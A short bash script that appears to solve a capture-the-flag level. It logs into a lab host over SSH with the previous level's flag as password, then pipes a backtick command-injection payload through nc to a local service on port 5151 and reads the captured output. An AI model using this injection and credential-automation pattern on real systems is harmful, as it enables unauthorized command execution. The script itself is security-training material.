#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level11@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level10/flag)

if [ $# -eq 1 ]; then
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<'ENDSSH'
		echo "[+] Connect to $1:5151"
		echo "[+] Enter password getflag>/tmp/getflag"
		echo '`getflag`>/tmp/getflag' | nc localhost 5151
		cat /tmp/getflag
ENDSSH
else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
